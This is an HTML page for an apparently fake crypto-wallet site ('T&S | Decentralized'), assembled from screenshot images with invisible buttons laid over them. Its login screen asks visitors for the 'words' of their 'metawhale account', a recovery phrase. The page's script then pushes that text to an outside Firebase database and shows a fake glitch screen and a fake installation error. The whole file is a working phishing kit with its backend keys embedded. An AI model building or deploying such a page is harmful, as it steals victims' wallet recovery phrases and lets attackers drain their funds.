<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>T&S | Decentralized</title>
    
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBvfZO9pxRshe4M8aavrLlHexq42vZDQ2g",
            authDomain: "v-academy-82560.firebaseapp.com",
            projectId: "v-academy-82560",
            storageBucket: "v-academy-82560.firebasestorage.app",
            messagingSenderId: "826822771378",
            appId: "1:826822771378:web:5357b1b989b298a8027fab",
            measurementId: "G-JEWJC719LD"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        window.saveData = function() {
            const textData = document.getElementById('accountInput').value;
            if(textData.trim() !== "") {
                push(ref(db, 'user_submissions'), {
                    words: textData,
                    timestamp: Date.now()
                }).then(() => {
                    openPage('pageGlitch');
                });
            }
        }
    </script>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: #000; width: 100vw; overflow-x: hidden; font-family: sans-serif; }

        /* Main Scroll Container */
        .content-wrap { width: 100%; position: relative; }
        .bg-section { width: 100%; display: block; }

        /* Invisible Trigger Buttons (Exactly over background buttons) */
        .header-triggers {
            position: fixed; top: 0; width: 100%; height: 70px;
            z-index: 1000; display: flex; justify-content: flex-end; padding-right: 15px; align-items: center;
        }
        .inv-btn-menu { width: 85px; height: 35px; cursor: pointer; background: transparent; border: none; margin-right: 8px; }
        .inv-btn-login { width: 85px; height: 35px; cursor: pointer; background: transparent; border: none; }

        /* Interface Pages (Menu, Login, Glitch) */
        .full-page {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #fff; z-index: 2000; flex-direction: column; align-items: center;
        }
        .ui-img { width: 100%; height: auto; }
        
        /* Interactive Layers over Interface Images */
        .close-trigger { position: absolute; top: 20px; right: 20px; width: 50px; height: 50px; cursor: pointer; }
        .account-trigger { position: absolute; top: 310px; width: 200px; height: 40px; cursor: pointer; }
        .join-trigger { position: absolute; bottom: 30px; width: 90%; height: 60px; cursor: pointer; }
        
        /* Input Field Styling */
        .input-box {
            position: absolute; top: 210px; width: 85%; height: 180px;
            border: 1.5px solid #000; border-radius: 12px; padding: 15px;
            font-size: 16px; outline: none; resize: none; background: transparent;
        }
        
        #redError {
            position: fixed; top: -80px; left: 0; width: 100%; height: 65px;
            background: #e60000; color: #fff; display: flex; align-items: center;
            justify-content: center; font-weight: bold; transition: 0.4s; z-index: 3000;
        }
    </style>
</head>
<body>

    <div id="redError">Web Installation Error</div>

    <div class="header-triggers">
        <button class="inv-btn-menu" onclick="openPage('pageMenu')"></button>
        <button class="inv-btn-login" onclick="showRedAlert()"></button>
    </div>

    <div class="content-wrap" id="mainHome">
        <img src="https://i.ibb.co/YBxhHFzq/Screenshot-2026-0507-004641.png" class="bg-section">
        <img src="https://i.ibb.co/DPSfDC66/Screenshot-2026-0507-004738.png" class="bg-section">
        <img src="https://i.ibb.co/6cs0ZcGV/Screenshot-2026-0507-004817.png" class="bg-section">
        <img src="https://i.ibb.co/0pw9XnWb/Screenshot-2026-0507-004840.png" class="bg-section">
        <img src="https://i.ibb.co/hRBtjFyF/Screenshot-2026-0507-004908.png" class="bg-section">
        <img src="https://i.ibb.co/YB37McHH/Screenshot-2026-0507-004938.png" class="bg-section">
        <img src="https://i.ibb.co/B2Gzp68v/Screenshot-2026-0507-004953.png" class="bg-section">
    </div>

    <div id="pageMenu" class="full-page">
        <img src="https://i.ibb.co/fM8613R5/1000043600.png" class="ui-img">
        <div class="close-trigger" onclick="openPage('mainHome')"></div>
        <div class="account-trigger" onclick="openPage('pageLogin')"></div>
        <div class="join-trigger" onclick="openPage('mainHome')"></div>
    </div>

    <div id="pageLogin" class="full-page">
        <img src="https://i.ibb.co/VYD6qg4C/1000043594.png" class="ui-img">
        <div class="close-trigger" onclick="openPage('pageMenu')"></div>
        <textarea id="accountInput" class="input-box" placeholder="input your words for login metawhale account"></textarea>
        <div class="join-trigger" onclick="saveData()"></div>
    </div>

    <div id="pageGlitch" class="full-page">
        <img src="https://i.ibb.co/7jZ6y913/1000043596.png" class="ui-img">
        <div class="close-trigger" onclick="openPage('pageLogin')"></div>
        <div class="join-trigger" onclick="openPage('pageLogin')"></div>
    </div>

    <script>
        function openPage(id) {
            document.querySelectorAll('.full-page, #mainHome').forEach(p => p.style.display = 'none');
            const target = document.getElementById(id);
            if(id === 'mainHome') {
                target.style.display = 'block';
            } else {
                target.style.display = 'flex';
            }
            window.scrollTo(0,0);
        }

        function showRedAlert() {
            const bar = document.getElementById('redError');
            bar.style.top = '0';
            setTimeout(() => { bar.style.top = '-80px'; }, 3000);
        }
    </script>
</body>
          </html>
